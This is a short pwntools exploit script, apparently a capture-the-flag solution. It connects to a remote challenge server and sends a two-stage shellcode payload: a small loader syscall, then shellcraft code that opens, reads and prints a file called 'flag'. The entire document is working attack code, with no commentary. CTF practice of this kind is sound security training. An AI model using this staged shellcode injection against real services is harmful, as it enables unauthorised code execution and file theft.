from pwn import *

context.update(arch="amd64", os="linux", log_level="debug")
context.terminal = ["-e", "qterminal"]
p=remote('node5.anna.nssctf.cn',28276)
#p = process("./vuln")
shellcode1=asm(
    '''
    mov rdi, rax
    mov rsi,0xCAFE0010
    syscall
    nop
'''
)
shellcode2 = (
    shellcraft.open("flag")
    + shellcraft.read("rax", "rsp", 100)
    + shellcraft.write(1, "rsp", 100)
)
paylaod2=asm(shellcode2)
p.send(shellcode1)
sleep(0.2)
p.sendline(paylaod2)
p.interactive()